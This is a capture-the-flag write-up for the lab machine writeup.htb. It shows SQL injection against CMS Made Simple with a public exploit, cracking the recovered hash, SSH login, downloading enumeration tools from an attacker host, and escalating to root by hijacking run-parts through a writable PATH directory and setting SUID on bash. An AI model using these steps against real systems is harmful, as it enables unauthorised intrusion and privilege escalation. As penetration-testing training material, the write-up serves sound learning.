# Writeup - Easy

```sh
sudo vim /etc/hosts
# add writeup.htb

nmap -T4 -p- -A -Pn -v writeup.htb
```

* open ports & services:

    * 22/tcp - ssh - OpenSSH 9.2p1 Debian 2+deb12u1
    * 80/tcp - tcpwrapped

* ```nmap``` detects the service on port 80 as 'tcpwrapped', but it is actually running a webpage

* the webpage on port 80 is not live yet and contains ascii art; it offers the following context:

    * ```wappalyzer``` shows that the page is running on Apache HTTP server 2.4.25

    * the page is not live but under attack

    * the webpage mentions a 'Eeyore DoS protection script' that watches for Apache 40x errors and bans IPs
    
    * a mail 'jkr@writeup.htb' is mentioned - possible that this is an user on the box

* before scanning directories, we can check for common directories and pages - one of them that is found on most of the websites is '/robots.txt'

* checking for this webpage shows this file exists - 'http://writeup.htb/robots.txt' includes a disallowed entry for '/writeup/'

* navigating to '/writeup', it seems to be a blog for writeups on machines, and there is some info on this page:

    * it links to an outgoing webpage for NetSec Focus Mattermost, but the link is dead as the website probably does not exist anymore

    * there a few writeups linked, and the format of the link is 'http://writeup.htb/writeup/index.php?page=ypuffy', where 'ypuffy' is the name of the box

    * ```wappalyzer``` identifies the CMS for the webpage as 'CMS Made Simple' - this is confirmed from the source code as well

* while the CMS is mentioned, we cannot find version information anywhere, and using tools like ```cmseek``` also don't help

* we cannot opt for directory scanning as that bans our IP and then we need to reset our machine

* in the source code, the webpage mentions '2004-2019' for the 'CMS Made Simple' copyright text - so it is possible that it is running a version from 2019

* Googling for exploits related to CMS Made Simple from 2019 lead to [CVE-2019-9053](https://www.exploit-db.com/exploits/46635) - an unauthenticated SQLi vuln affecting CMS Made Simple versions <= 2.2.9

* we can attempt this version:

    ```sh
    vim 46635.py
    # the exploit needs python2

    # if we do not have python2 installed, we can convert python2 code to python3 code

    python3 -m lib2to3 -w 46635.py
    # -m to run the lib2to3 module as a script
    # -w to overwrite the changes to the same file

    python3 46635.py -u http://writeup.htb/writeup --crack -w /usr/share/wordlists/rockyou.txt
    # this fails in the first run

    # as the SQLi vuln is time-based, we can try increasing the time value

    vim 46635.py
    # modify 'TIME' variable from 1 to 3

    python3 46635.py -u http://writeup.htb/writeup --crack -w /usr/share/wordlists/rockyou.txt
    # this worked halfway through, but gave an error when cracking the password
    # "UnicodeDecodeError: 'utf-8' codec can't decode byte 0xf1 in position 933: invalid continuation byte"

    file -i /usr/share/wordlists/rockyou.txt
    # file encoding is shown as 'utf-8', but we still get the error

    # to fix this, we need to convert the 'rockyou.txt' wordlist to 'utf-8' format
    cp /usr/share/wordlists/rockyou.txt rockyou.txt
    # create a copy of rockyou to local dir
    
    vim rockyou.txt
    
    # in vim, check file encoding
    :set fileencoding
    # this shows 'latin-1'

    # convert to 'utf-8'
    :set fileencoding=utf-8
    :set nobomb
    :wq
    # saves and quits the editor

    # attempt the exploit again with utf-8 wordlist now
    python3 46635.py -u http://writeup.htb/writeup --crack -w rockyou.txt
    # this gives the salt and password but fails to crack it
    ```

* the exploit works, and we get the following details, but the password is not actually cracked yet as that part fails:

    * salt for password - 5a599ef579066807
    * username - jkr
    * email - jkr@writeup.htb
    * password - 62def4866937f08cc13bab43bb14e6f7

* the cracking step fails, but as we have the salt and password, we can crack it using ```hashcat```

* checking the exploit logic, we can see this line in the password cracking function - ```if hashlib.md5(str(salt) + line).hexdigest() == password:``` - which indicates the hash is stored in format 'MD5(salt+pass)'

* from the [hashcat example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes), we can see that this correlates with hash mode 20 - we can now crack the hash:

    ```sh
    hashcat -m 20 62def4866937f08cc13bab43bb14e6f7:5a599ef579066807 /usr/share/wordlists/rockyou.txt
    # the hash still needs to be in format 'pass:salt'
    ```

* ```hashcat``` works and we get the cleartext 'raykayjay9' - we can use this to try logging in as 'jkr' on the box:

    ```sh
    ssh jkr@writeup.htb
    # this works

    cat user.txt
    # user flag

    ls -la /var/www/html
    # check web files

    ls -la /var/www/html/writeup
    # permission denied, owned by 'www-data'
    ```

* we can attempt basic enum using ```linpeas``` - fetch the script from attacker:

    ```sh
    wget http://10.10.14.28:8000/linpeas.sh

    chmod +x linpeas.sh

    ./linpeas.sh
    ```

* findings from ```linpeas```:

    * Linux version 6.1.0-13-amd64, Devuan GNU/Linux 5.0
    * ```/usr/local/bin```, ```/usr/local/sbin``` & ```/usr/local/games``` highlighted as writable in PATH variable, as we are part of group 'staff'
    * ```fail2ban-server``` is running - which could be blocking the IPs from directory scanning the webpage
    * ```mysql``` is running on port 3306
    * ```/usr/local/lib``` highlighted under misconfigurations of 'ld.so' section, for ```/etc/ld.so.conf.d``` directory

* we can try logging into ```mysql``` as users like 'jkr', 'admin' or 'root' using the same password but that does not work

* we can try fetching & running ```pspy``` to check for any background processes or cronjobs:

    ```sh
    wget http://10.10.14.28:8000/pspy64

    chmod +x pspy64

    ./pspy64
    ```

* ```pspy``` shows a script ```/root/bin/cleanup.pl``` runs every minute, but we cannot access this script

* checking the writable directories in the PATH variable due to our 'staff' group membership:

    ```sh
    echo $PATH
    # '/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games'
    ```

* we can check the [exploit for staff group](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html#staff-group) - this shows the PATH variable config shown here is common in Debian distros

* this mentions that when a new SSH session login is initiated, the ```run-parts``` program is triggered

* we can confirm this by running ```pspy```, and starting a new SSH session:

    ```sh
    ./pspy64

    # from attacker, login as 'jkr' again
    ssh jkr@writeup.htb
    ```

* checking the processes on ```pspy``` shows the processes ``` sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new``` & ```run-parts --lsbsysinit /etc/update-motd.d``` after SSH session is created

* we can exploit the ```run-parts``` binary:

    ```sh
    which run-parts
    # /bin/run-parts

    # create new run-parts script
    vi /usr/local/bin/run-parts
    ```

    ```sh
    #!/bin/bash
    chmod 4777 /bin/bash
    ```

    ```sh
    # make the binary executable
    chmod +x /usr/local/bin/run-parts
    ```

    ```
    # on attacker, start a new SSH session
    ssh jkr@writeup.htb

    ls -la /bin/bash
    # 'bash' has SUID bit set now

    /bin/bash -p
    # this gives root shell

    cat /root/root.txt
    # root flag
    ```
